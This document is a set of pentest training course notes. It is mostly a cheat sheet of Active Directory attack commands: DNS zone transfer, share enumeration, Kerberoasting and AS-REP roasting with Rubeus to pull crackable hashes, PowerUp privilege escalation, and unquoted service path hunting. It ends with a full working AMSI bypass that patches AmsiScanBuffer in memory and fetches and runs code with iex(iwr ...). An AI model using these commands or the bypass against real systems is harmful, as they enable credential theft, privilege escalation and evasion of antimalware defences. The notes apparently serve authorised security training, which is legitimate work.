*Day 1 notes from Light Pentest LITE (Live Interactive Training Experience)  
More information at https://7minsec.com/services/training/#lplite*

# Where are we on the network?
```
nslookup -type=SRV _ldap._tcp.dc._msdcs.tangent.town
```

# DNS zone transfers
```
nslookup
set type=any
ls -d tangent.town
```
# Network share enumeration
```
import-module .\PowerHuntShares.psm1
mkdir dump
Invoke-HuntSMBShares -OutputDirectory dump
```

# Kerberoasting
Basic Kerberoasting
```
rubeus.exe kerberoast /simple
```
Kerberoasting with a side order of text output sauce:
```
rubeus.exe kerberoast /simple /outfile:kerberoast.txt
```

# ASREPRoasting
Classic style:
```
rubeus.exe asreproast
```
ASREPRoasting with clean output that's ready for hashcat to gnaw on:
```
rubeus.exe asreproast /format:hashcat /nowrap
```

ASREPRoasting with clean output that's ready for hashcat *and* text output sauce:
```
rubeus.exe asreproast /format:hashcat /nowrap /outfile:asreproast.txt
```

# Privilege escalation with PowerSploit
```
Import-Module .\PowerUp.ps1 
get-help Write-ServiceBinary -examples
```

# Unquoted service paths
Finding USPs from the command line:
```
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```

Finding permissions on folders using icacls:
```
icacls "C:\first folder\second folder"
icacls "C:\first folder"
```

# Bypass AMSI
Source article: https://x4sh3s.github.io/posts/Divide-and-bypass-amsi

*1.txt*:
```
# 1.txt
$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
```

*2.txt*:
```
# 2.txt
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

*main.txt*:
```
# main.ps1
$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

iex ( iwr http://localhost/1.txt -UseBasicParsing );
iex ( iwr http://localhost/2.txt -UseBasicParsing );
```
